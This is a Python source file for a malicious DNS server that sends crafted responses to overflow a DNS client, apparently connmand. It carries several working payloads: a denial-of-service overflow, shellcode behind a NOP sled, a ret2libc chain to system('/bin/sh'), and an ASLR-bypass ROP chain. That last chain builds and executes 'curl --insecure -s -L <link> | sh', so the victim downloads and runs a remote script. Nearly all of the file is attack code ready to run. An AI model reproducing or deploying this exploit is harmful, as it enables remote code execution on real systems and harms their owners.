#!/usr/bin/env python3
# Copyright (c) 2014 Patryk Hes. Licensed under MIT license.


import socketserver
import sys
import struct as s
#from pwn import *

DNS_HEADER_LENGTH = 12
# TODO make some DNS database with IPs connected to regexs
IP = '127.0.0.1'
IPconn = '82.165.8.211'

def dw(x):
  return s.pack('>H', x)

def p64(x):
  return s.pack('<Q',x)

def string_split(string_data):
    word_size = 8
    fill_f=b'\xff'
    fill_0=b'\x00'
    sub_list=[]
    for i in range(0, len(string_data), word_size):
        sub_data = string_data[i: i+word_size]
        if len(sub_data) < word_size:
            sub_data += fill_f + fill_0 *(word_size-1-len(sub_data))
        #int_hex=int(sub_data.hex(),16)
        #le = struct.pack('<Q',int_hex)
        #hex_=hex(int(le.hex(),16))
        sub_list.append(sub_data)

    return sub_list

class DNSHandler(socketserver.BaseRequestHandler):
	def handle(self):
		socket = self.request[1]
		data = self.request[0].strip()

		# If request doesn't even contain full header, don't respond.
		if len(data) < DNS_HEADER_LENGTH:
			return

		# Try to read questions - if they're invalid, don't respond.
		try:
			all_questions = self.dns_extract_questions(data)
		except IndexError:
			return

		# Filter only those questions, which have QTYPE=A and QCLASS=IN
		# TODO this is very limiting, remove QTYPE filter in future, handle different QTYPEs
		accepted_questions = []
		for question in all_questions:
			name = str(b'.'.join(question['name']), encoding='UTF-8')
			if question['qtype'] == b'\x00\x01' and question['qclass'] == b'\x00\x01':
				accepted_questions.append(question)
				print('\033[32m{}\033[39m'.format(name))
			else:
				print('\033[31m{}\033[39m'.format(name))

		send = True
		if (len(accepted_questions)==0):
			response = (
				self.dns_response_header(data) +
				self.dns_response_questions(accepted_questions) +
				self.dns_response_answers(accepted_questions)
			)
		elif (accepted_questions[0]['name'][0] == b'dos'):
			send = True
			response = (
				self.dns_dos_payload(data)
			)
		elif (accepted_questions[0]['name'][0] == b'shell'):
			send = True
			response = (
				self.dns_shell_payload(data)
			)
		elif (accepted_questions[0]['name'][0] == b'libc'):
			send = True
			response = (
				self.dns_libc_payload(data)
			)

		elif (accepted_questions[0]['name'][0] == b'aslr'):
			send = True
			response = (
				self.dns_aslr_payload(data)
			)

		else: 
			response = (
				self.dns_response_header(data) +
				self.dns_response_questions(accepted_questions) +
				self.dns_response_answers(accepted_questions)
			)

		if (send):
			socket.sendto(response, self.client_address)
		
			

	def dns_extract_questions(self, data):
		"""
		Extracts question section from DNS request data.
		See http://tools.ietf.org/html/rfc1035 4.1.2. Question section format.
		"""
		questions = []
		# Get number of questions from header's QDCOUNT
		n = (data[4] << 8) + data[5]
		# Where we actually read in data? Start at beginning of question sections.
		pointer = DNS_HEADER_LENGTH
		# Read each question section
		for i in range(n):
			question = {
				'name': [],
				'qtype': '',
				'qclass': '',
			}
			length = data[pointer]
			# Read each label from QNAME part
			while length != 0:
				start = pointer + 1
				end = pointer + length + 1
				question['name'].append(data[start:end])
				pointer += length + 1
				length = data[pointer]
			# Read QTYPE
			question['qtype'] = data[pointer+1:pointer+3]
			# Read QCLASS
			question['qclass'] = data[pointer+3:pointer+5]
			# Move pointer 5 octets further (zero length octet, QTYPE, QNAME)
			pointer += 5
			questions.append(question)
		return questions

	def dns_response_header(self, data):
		"""
		Generates DNS response header.
		See http://tools.ietf.org/html/rfc1035 4.1.1. Header section format.
		"""
		header = b''
		# ID - copy it from request
		header += data[:2]
		# QR     1    response
		# OPCODE 0000 standard query
		# AA     0    not authoritative
		# TC     0    not truncated
		# RD     0    recursion not desired
		# RA     0    recursion not available
		# Z      000  unused
		# RCODE  0000 no error condition
		header += b'\x81\x80'
		# QDCOUNT - question entries count, set to QDCOUNT from request
		header += data[4:6]
		# ANCOUNT - answer records count, set to QDCOUNT from request
		header += data[4:6]
		# NSCOUNT - authority records count, set to 0
		header += b'\x00\x00'
		# ARCOUNT - additional records count, set to 0
		header += b'\x00\x00'
		return header

	def dns_response_questions(self, questions):
		"""
		Generates DNS response questions.
		See http://tools.ietf.org/html/rfc1035 4.1.2. Question section format.
		"""
		sections = b''
		for question in questions:
			section = b''
			for label in question['name']:
				# Length octet
				section += bytes([len(label)])
				section += label
			# Zero length octet
			section += b'\x00\x00\x01\x00\x01\xc0\x0c'
			section += question['qtype']
			section += question['qclass']
			sections += section
		return sections

	def dns_response_answers(self, questions):
		"""
		Generates DNS response answers.
		See http://tools.ietf.org/html/rfc1035 4.1.3. Resource record format.
		"""
		records = b''
		for question in questions:
			record = b''
			# TTL - 32 bit unsigned integer. Set to 0 to inform, that response
			# should not be cached.
			record += b'\x00\x00\x00\x05'
			# RDLENGTH - 16 bit unsigned integer, length of RDATA field.
			# In case of QTYPE=A and QCLASS=IN, RDLENGTH=4.
			record += b'\x00\x04'
			# RDATA - in case of QTYPE=A and QCLASS=IN, it's IPv4 address.
			record += b''.join(map(lambda x: bytes([int(x)]),IPconn.split('.')))
			records += record
		return records

	def dns_dos_payload(self, data):
		records = b''
		records += (data[:2] + b'\x81\x80')     # id + flags
		records += dw(1)                        # questions
		records += dw(0x52)                     # answers
		records += dw(0)                        # authoritative
		records += dw(0)                        # additional
		records += b'\x01X\x00\x00\x01\x00\x01\xc0\x0d'
		records += b'Z' * 1088
		records += b'A' * 6                     # A = 41 in hex (ascii)

		return records

	def dns_shell_payload(self, data):
		records = b''
		records += (data[:2] + b'\x81\x80')     # id + flags
		records += dw(1)                        # questions
		records += dw(0x52)                     # answers
		records += dw(0)                        # authoritative
		records += dw(0)                        # additional
		records += b'\x01X\x00\x00\x01\x00\x01\xc0\x0d'
		records += (b'\x90' * 547 + b'\xeb\x0f\x48\x61\x63\x6b\x65\x64\x20\x62\x79\x20\x55\x4e\x43\x43\x0a\x31\xc0\xff\xc0\x89\xc7\x48\x8d\x35\xe4\xff\xff\xff\x31\xd2\xb2\x0f\x0f\x05\x31\xc0\xb0\x3c\x31\xff\x0f\x05' + b'\x90' * 497 + b'\x20\xd1\xff\xff\xff\x7f') #0x7fffffffd120

		return records

	def dns_libc_payload(self, data):
		records = b''
		records += (data[:2] + b'\x81\x80')     # id + flags
		records += dw(1)                        # questions
		records += dw(0x52)                     # answers
		records += dw(0)                        # authoritative
		records += dw(0)                        # additional
		records += b'\x01X\x00\x00\x01\x00\x01\xc0\x0d'
		records += b'Z' * 1088

		bin_sh_string = 0x7ffff7d095aa
		system = 0x7ffff7ba7410
		pop_rdi = 0x40fea4
		ret = pop_rdi + 1

		records += p64(pop_rdi)
		records += p64(bin_sh_string) # bash address
		records += p64(ret)
		records += p64(system) # system function address

		return records


	def dns_aslr_payload(self, data):
		records = b''
		records += (data[:2] + b'\x81\x80')     # id + flags
		records += dw(1)                        # questions
		records += dw(0x52)                     # answers
		records += dw(0)                        # authoritative
		records += dw(0)                        # additional
		records += b'\x01X\x00\x00\x01\x00\x01\xc0\x0d'

		records += b'Z' * 1088
		
		memcpy_plt = 0x40fc90
		execlp_plt = 0x41a9ce
		exit_plt = 0x41a9d5
		bss = 0x4c8300 # found with: readelf -S connman-1.34/src/connmand | grep bss
		junk = 0x4141414141414141

		file_link = sys.argv[3]
		bin_sh_loc = bss
		hypen_c_loc = bss + 14
		command_loc = bss + 20

		pop_rdi = 0x40fea4
		pop_rsi = 0x41066b
		pop_rdx_rbx = 0x44625f
		pop_rcx = 0x43a2b3
		pop_r8 = 0x4284a7 # pop r8; ret;

		pop_rsp = 0x00000000004106ad # pop rsp; ret;
		add_rsp = 0x000000000042b14e #: add rsp, 0x68; ret;

		# all found by finding start and end addressess of connmand with "vmmap connmand" and then "find [start], [end], "[char]""
		chars = {
			'a': 0x4b6eac,
			'b': 0x4b6c28,
			'c': 0x4b6f90,
			'd': 0x4b6fec,
			'e': 0x4b6706,
			'f': 0x4b6e9c,
			'g': 0x4b67d6,
			'h': 0x4b6b88,
			'i': 0x4b6130,
			'j': 0x4b6ec6,
			'k': 0x4b716c,
			'l': 0x4b6c8c,
			'm': 0x4b70dd,
			'n': 0x4b66cc,
			'o': 0x4b6bac,
			'p': 0x4b7090,
			'q': 0x4b6c32,
			'r': 0x4b70d4,
			's': 0x4b6b5c,
			't': 0x4b6e94,
			'u': 0x4b6ea6,
			'v': 0x4b63f4,
			'w': 0x4b7140,
			'x': 0x4b6478,
			'y': 0x4b625c,
			'z': 0x4b624c,
			'0': 0x4b711f,
			'1': 0x4b4cf4,
			'2': 0x4b4f84,
			'3': 0x4b49fd,
			'4': 0x4b69bc,
			'5': 0x4b4bdd,
			'6': 0x4b5f90,
			'7': 0x4b7104,
			'8': 0x4b70f8,
			'9': 0x4b5005,
			':': 0x4b50dd,
			':': 0x4b50dd,
			',': 0x4b6eb0,
			'.': 0x4b6368,
			'-': 0x4b4551,
			'/': 0x4b55bc,
			' ': 0x4b7470,
			'|': 0x4b8c60,
			'L': 0x4b7a94,
			'url': 0x4087b1,
			'sh0': 0x40635b,
			'+': 0x4a4171 # this will represent a null character
		}

		'''Paste a character sequence [char] of length [length] to address [bss_write_start] + [offset]'''
		def paste_char_to_bass(char: str, length: int, bss_write_start: int, offset: int):
			sub_record = b''
			sub_record += p64(pop_rdx_rbx) # pop rdx; pop rbx; ret; addr. (found in connmand executable with ropper)
			sub_record += p64(length) # 0x1 addr.
			sub_record += p64(junk) # junk for pop rbx instruction

			sub_record += p64(pop_rsi) # pop rsi addr. (found in connmand executable with ropper)
			sub_record += p64(chars[char]) # char addr.

			sub_record += p64(pop_rdi) # pop rdi addr. (found in connmand executable with ropper)
			sub_record += p64(bss_write_start + offset) # .bss + offset addr.

			sub_record += p64(memcpy_plt) # address to memcpy@plt

			return sub_record
		'''Perform execlp portion of the payload: populate registers and call execlp@plt'''
		def execlp_payload(args_list_1: list, args_list_2: list):
			sub_records = b''
			sub_records += p64(pop_rdi) # pop rdi addr. (found in connmand executable with ropper)
			#sub_records += p64(bss + 5 + 14 + len(file_link)) # address of "sh\0" from end of 0x4c8305 (bss+5): 'curl -s -L [file_link] | sh'

			sub_records += p64(bin_sh_loc) # address of "sh\0" from end of 0x4c8305 (bss+5): 'curl -s -L [file_link] | sh'

			sub_records += p64(pop_rsi) # pop rsi address.
			#sub_records += p64(bss + 5 + 14 + len(file_link))
			sub_records += p64(bin_sh_loc)

			sub_records += p64(pop_rdx_rbx) # pop rdx addr.

			# sub_records += p64(bss) # where we started write of link
			sub_records += p64(hypen_c_loc) # where we started write of link
			sub_records += p64(junk) # junk for pop rbx instruction

			sub_records += p64(pop_rcx) # pop rcx addr.
			#sub_records += p64(bss + 5) # start of main curl command
			sub_records += p64(command_loc) # start of main curl command

			sub_records += p64(pop_r8) # pop r8 addr.
			sub_records += p64(0x0) # NULL byte

			sub_records += p64(execlp_plt) # address to execlp@plt

			return sub_records


		def paste_string_to_bass(string_data, write_start):
		    sub_record = b''

		    data_lst = string_split(string_data)

		    address_shift = 0
		    for x in data_lst:
		    	sub_record += p64(0x4284a7)	# pop r8; ret 
		    	sub_record += p64(write_start + address_shift)
		    	sub_record += p64(0x4284a8)	# pop rax; ret 
		    	sub_record += x
		    	sub_record += p64(0x413dcb)	# mov rdx, rax; mov qword ptr [r8], rdx; xor eax, eax; ret
		    	address_shift += 8
		    return sub_record


		# data getting cut off... move stack up
		add_rsp = 0x0000000000475a8d # add rsp, 0x450; mov eax, ebx; pop rbx; pop rbp; pop r12; ret;
		records += p64(add_rsp)
		records += b'c' *  11

		c_arg = "-c+"
		# we write these as lists instead of a string bc we can save memcpy writes by grouping together available character sequences
		main_command1 =  ['c', 'url', ' ', '-', 's', ' ', '-', 'L', ' ']
		main_command2 = [' ', '|', ' ', 'sh0'] # "curl -s -L {} | sh+".format(file_link)

		'''
		# we begin this write as bss base
		for i in range(len(c_arg)):
			records += paste_char_to_bass(c_arg[i], 1, bss, i)

		# we begin this write at the base address of bss + 5
		# THIS GIVES: 0x4c8305 (bss+5): 'curl -s -L '
		for i in range(len(main_command1)):
			records += paste_char_to_bass(main_command1[i], len(main_command1[i]), bss+5, len(''.join(main_command1[:i])))

		# THIS GIVES: 0x4c8305 (bss+5): 'curl -s -L [file_link]'
		for i in range(len(file_link)):
			records += paste_char_to_bass(file_link[i], 1, bss + 5 + len(main_command1) + 2, i)

		# THIS GIVES: 0x4c8305 (bss+5): 'curl -s -L [file_link] | sh'
		for i in range(len(main_command2)):
			records += paste_char_to_bass(main_command2[i], len(main_command2[i]), bss + 5 + len(main_command1) + 2 + len(file_link), len(''.join(main_command2[:i])))
		'''

		#/usr/bin/dash -c 'curl -L https://raw.githubusercontent.com/thegenghiskahn/testingshellwget/main/test.sh'

		records += paste_string_to_bass(b'/bin/sh\0', bin_sh_loc)
		records += paste_string_to_bass(b'-c\0', hypen_c_loc)
		command_all = "curl --insecure -s -L " + file_link +" | sh\0"
		records += paste_string_to_bass(str.encode(command_all), command_loc)


		# FINAL FUNCTION CALL: execlp("sh", "sh", "-c", "curl -s -L [file_link] | sh", (char *) NULL);

		# execlp payload
		records += execlp_payload(main_command1, main_command2)

		

		return records



#p64 = lambda x: pack("Q",x)
if __name__ == '__main__':
	# Minimal configuration - allow to pass IP in configuration
	if len(sys.argv) < 3:
	   print("\nUSAGE : " + sys.argv[0] +
	            " <IPv4> <Port> <SSH Link>")
	   sys.exit()

	IP = sys.argv[1]
	PORT = sys.argv[2]
	host, port = IP, int(PORT)
	server = socketserver.ThreadingUDPServer((host, port), DNSHandler)
	print('\033[36mStarted DNS server.\033[39m')
	try:
		server.serve_forever()
	except KeyboardInterrupt:
		server.shutdown()
		sys.exit(0)